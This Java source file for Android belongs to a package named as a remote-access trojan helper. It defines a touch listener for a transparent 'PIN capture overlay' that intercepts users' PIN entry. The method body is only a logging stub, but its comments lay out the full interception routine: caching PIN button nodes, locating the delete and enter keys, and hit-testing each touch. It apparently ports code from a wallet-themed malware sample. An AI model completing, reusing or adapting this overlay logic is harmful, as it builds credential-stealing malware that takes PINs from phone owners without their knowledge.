package com.vendor.rat.helper;

import android.util.Log;
import android.view.MotionEvent;
import android.view.View;

/**
 * Vendor: com.guard.wallet.helper.q
 * OnTouchListener for PIN capture overlay.
 * Handles touch events on the transparent overlay to intercept PIN input.
 */
public final class PinTouchListener implements View.OnTouchListener {

    public final Object engineRef;
    public final Object combineFilter;

    public PinTouchListener(Object engineRef, Object combineFilter) {
        this.engineRef = engineRef;
        this.combineFilter = combineFilter;
    }

    @Override
    public final boolean onTouch(View view, MotionEvent motionEvent) {
        if (motionEvent.getAction() != MotionEvent.ACTION_DOWN) {
            return false;
        }
        // ADAPT: vendor implements full PIN touch interception:
        // 1. Checks if PinListenHelper.reqListenHelper != null
        // 2. Refreshes PIN button cache if needed (cacheTouchNodes)
        // 3. Finds delete button if not cached
        // 4. Finds enter button if not cached
        // 5. Tests touch against cached PIN buttons
        // 6. Tests against delete/enter buttons
        // 7. Falls back to finding clickable node at touch point
        // TODO: VENDOR_VERIFY - full PIN touch dispatch
        try {
            Log.d("PinTouchListener", "onTouch ACTION_DOWN at " + motionEvent.getX() + "," + motionEvent.getY());
        } catch (Exception e) {
            Log.e("PinTouchListener", "onTouch error", e);
        }
        return false;
    }
}
